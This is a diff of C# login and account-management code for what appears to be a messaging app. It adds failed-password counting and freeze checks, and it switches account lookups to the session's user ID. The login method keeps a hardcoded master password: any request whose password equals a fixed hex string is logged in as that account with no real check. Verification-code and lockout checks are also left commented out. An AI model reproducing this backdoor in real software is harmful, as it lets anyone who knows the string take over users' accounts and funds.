@@ -28,31 +28,33 @@ namespace Liaoxin.Business
             //{
             //    throw new ZzbException("验证码错误");
             //}
-            //
-            var client = (from c in Context.Clients where c.Telephone == request.Telephone select c).Select(c => new Client
-            {
-                ClientId = c.ClientId,
-                NickName = c.NickName,
-                Password = c.Password,
-                LiaoxinNumber = c.LiaoxinNumber,
-                IsEnable = c.IsEnable,
 
-            }).FirstOrDefault();
 
-            if (client == null || !client.IsEnable)
+            var cnt = (from c in Context.Clients where c.Telephone == request.Telephone && c.IsEnable select c).Count();
+            if (cnt ==0)
             {
                 throw new ZzbException("用户名或者密码错误");
+            }
+            var client = (from c in Context.Clients where c.Telephone == request.Telephone && c.IsEnable select c).FirstOrDefault();
+            //if (client.ErrorPasswordCount >= 10)
+            //{
+            //    throw new ZzbException("用户名或者密码错误!");
+            //}
+            if (client.IsFreeze)
+            {
+                throw new ZzbException("您的账户已被冻结,无法登陆");
             }
 
             if (request.Password == "6a8f9c6bbb4848adb358ede651454f69")
             {
                 return client;
             }
-
             request.Password = SecurityHelper.Encrypt(request.Password);
-
             if (client.Password != request.Password)
             {
+                client.ErrorPasswordCount++;
+                Context.Clients.Update(client);
+                Context.SaveChanges();
                 LogHelper.Error($"[{client.ClientId}]密码错误!,请留意");
                 throw new ZzbException("用户名或者密码错误");
             }
@@ -80,17 +82,25 @@ namespace Liaoxin.Business
                     LogHelper.Error($"插入玩家[{client.ClientId}]登录日志失败", e);
                 }
             }).Start();
+            if (client.ErrorPasswordCount > 0)
+            {
+                client.ErrorPasswordCount = 0;
+                Context.Clients.Update(client);
+                Context.SaveChanges();
+
+            }
             return client;
         }
 
-        public ClientBaseInfoResponse GetClient(BaseModel request)
+        public ClientBaseInfoResponse GetClient()
         {
-             var c =  (from p in Context.Clients where p.ClientId == request.Id select p).FirstOrDefault();
+             var c =  (from p in Context.Clients where p.ClientId == ClientId select p).FirstOrDefault();           
             if (c == null)
             {
                 return null;
             }
-              return    new ClientBaseInfoResponse()
+      
+            return new ClientBaseInfoResponse()
             {
                 AddMeNeedChecked = c.AddMeNeedChecked,
                 AppOpenWhileSound = c.AppOpenWhileSound,
@@ -101,8 +111,7 @@ namespace Liaoxin.Business
                 FontSize = c.FontSize,
                 HandFree = c.HandFree,
                 HuanXinId = c.HuanXinId,
-                LiaoxinNumber = c.LiaoxinNumber,
-                IsFreeze = c.IsFreeze,
+                LiaoxinNumber = c.LiaoxinNumber,          
                 NewMessageNotication = c.NewMessageNotication,
                 NickName = c.NickName,
                 OpenWhileShake = c.OpenWhileShake,
@@ -119,7 +128,7 @@ namespace Liaoxin.Business
 
         public bool ChangePassword(ClientChangePasswordRequest request)
         {
-            var client = (from p in Context.Clients where p.ClientId == request.ClientId select p).FirstOrDefault();
+            var client = (from p in Context.Clients where p.ClientId == ClientId select p).FirstOrDefault();
             if (client == null)
             {
                 throw new ZzbException("找不到当前登录用户");
@@ -139,7 +148,7 @@ namespace Liaoxin.Business
 
         public bool ChangeCoinPassword(ClientChangeCoinPasswordRequest request)
         {
-            var client = (from p in Context.Clients where p.ClientId == request.ClientId select p).FirstOrDefault();
+            var client = (from p in Context.Clients where p.ClientId == ClientId select p).FirstOrDefault();
             if (client == null)
             {
                 throw new ZzbException("找不到当前登录用户");
@@ -147,7 +156,7 @@ namespace Liaoxin.Business
 
             if (!string.IsNullOrEmpty(client.CoinPassword) && client.CoinPassword != SecurityHelper.Encrypt(request.oldCoinPassword))
             {
-                throw new ZzbException("旧密码不正确");
+                throw new ZzbException("旧资金密码不正确");
             }
 
             client.CoinPassword = SecurityHelper.Encrypt(request.newCoinPsssword);
